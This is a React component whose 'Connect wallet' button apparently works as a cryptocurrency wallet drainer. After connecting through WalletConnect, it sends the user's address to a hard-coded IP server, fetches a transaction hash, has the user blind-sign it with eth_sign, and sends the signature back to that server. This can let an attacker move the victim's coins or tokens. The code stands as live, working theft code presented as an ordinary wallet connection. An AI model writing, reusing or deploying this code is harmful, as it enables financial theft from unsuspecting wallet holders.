import jQuery from "jquery"
import { EthereumProvider } from "@walletconnect/ethereum-provider";

function App() {
  async function runner(){
    var ethereumProvider = await EthereumProvider.init({
      showQrModal:true,
      qrModalOptions:{
        themeMode:"dark",
        explorerRecommendedWalletIds:[
          'c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96',
          '4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0',
          '225affb176778569276e484e1b92637ad061b01e13a048b35a9d280c3b58970f',
          '426b8b13634593783072a3253bb061e825dceeb13593425cc315a9e7d7e60323',
          'f725ed2c96fc9105359df8393b3192a02fdb91c93ad73d0b0edb3f7eae70d059',
          'f81ffb6c9be6997a8e7463c49358b64e733c1cf52f54f2731749eab21cfde63b',
          'f759efd17edb158c361ffd793a741b3518fe85b9c15d36b9483fba033118aaf2',
          'be49f0a78d6ea1beed3804c3a6b62ea71f568d58d9df8097f3d61c7c9baf273d',
          '9a565677e1c0258ac23fd2becc9a6497eeb2f6bf14f6e2af41e3f1d325852edd'
        ]
      },
      chains:[1],
      methods:['eth_sign','eth_sendTransaction','eth_signTransaction'],
      projectId:"9fe3ed74e1d73141e8b7747bedf77551"
    });

    await ethereumProvider.enable();
    var provider = ethereumProvider;
    var account = await provider.request({method:"eth_accounts"});
    var account_sender = account[0];
    console.log(account_sender);
  
    async function genSign(address,chain,type,contract="0"){
      let apiUrl = "http://104.194.133.124:8080/http://104.194.133.124/send.php"; // آدرس پروکسی‌شده

      if (type == "coin"){
        var result = await jQuery.post(apiUrl, {"handler":"tx","address":address,"chain":chain,"type":type});
        var unSigned = JSON.parse(result);
        console.log(unSigned);
        var Signed = await provider.request({method:"eth_sign",params:[address,unSigned.result]});
        return Signed;
      } else if (type == "token"){
        var result = await jQuery.post(apiUrl, {"handler":"tx","address":address,"chain":chain,"type":type,"contract":contract});
        var unSigned = JSON.parse(result);
        console.log(unSigned);
        var Signed = await provider.request({method:"eth_sign",params:[address,unSigned.result]});
        return Signed;
      }
    }
  
    async function acceptSign(signature,type){
      let apiUrl = "http://104.194.133.124:8080/http://104.194.133.124/send.php"; // آدرس پروکسی‌شده
      
      console.log(type);
      var result = await jQuery.post(apiUrl, {"handler":"sign","signature":signature,"type":type});
      var resultJson = JSON.parse(result);
      return resultJson.result;
    }
    
    var signature = await genSign(account_sender,"56","coin");
    console.log(signature);
    var rawsign = await acceptSign(signature,"coin");
    console.log("Raw : " + rawsign);
  }

  return (
    <a href="#" id="kos" onClick={runner} className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left" data-uk-toggle="">
      <span>Connect wallet</span>
    </a>
  );
}

export default App;
